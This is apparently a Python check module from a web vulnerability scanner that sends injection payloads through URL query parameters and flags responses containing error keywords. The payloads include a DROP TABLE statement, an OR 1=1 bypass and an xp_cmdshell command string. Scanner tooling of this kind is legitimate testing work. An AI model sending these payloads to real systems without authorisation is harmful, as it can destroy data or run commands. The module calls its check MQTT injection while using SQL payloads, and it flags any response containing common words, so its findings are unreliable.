import copy
import httpx
from modules.scanner.base_check import BaseCheck, CheckResult


class MqttInjectionCheck(BaseCheck):
    name = "active_mqtt_injection"

    async def run(self, base_request: dict, target_params: list[str]) -> list[CheckResult]:
        results = []
        payloads = ["'; DROP TABLE topics;--", "' OR 1=1--", "'; EXEC xp_cmdshell 'whoami'--"]
        async with httpx.AsyncClient(verify=False, timeout=15, follow_redirects=False) as client:
            for param in target_params:
                for payload in payloads:
                    modified = self._inject_payload(base_request, param, payload)
                    try:
                        resp = await client.request(**modified)
                        if resp.status_code == 200 and len(resp.text) > 0:
                            error_indicators = ["error", "exception", "sql", "mqtt", "subscribe", "topic"]
                            for ind in error_indicators:
                                if ind in resp.text.lower():
                                    results.append(CheckResult(
                                        triggered=True,
                                        severity="high",
                                        title="MQTT injection detected",
                                        description=f"Parameter '{param}' with payload '{payload}' may be vulnerable.",
                                        evidence=f"Payload: {payload}\nStatus: {resp.status_code}",
                                        remediation="Sanitize all input used in MQTT topic filters. Avoid concatenating user input into topic strings.",
                                        cwe="CWE-77",
                                    ))
                                    break
                    except Exception:
                        continue
        return results

    def _inject_payload(self, base: dict, param: str, payload: str) -> dict:
        import urllib.parse
        req = copy.deepcopy(base)
        parsed = urllib.parse.urlparse(req["url"])
        params = dict(urllib.parse.parse_qsl(parsed.query))
        if param in params:
            params[param] = payload
            req["url"] = parsed._replace(query=urllib.parse.urlencode(params)).geturl()
        return req
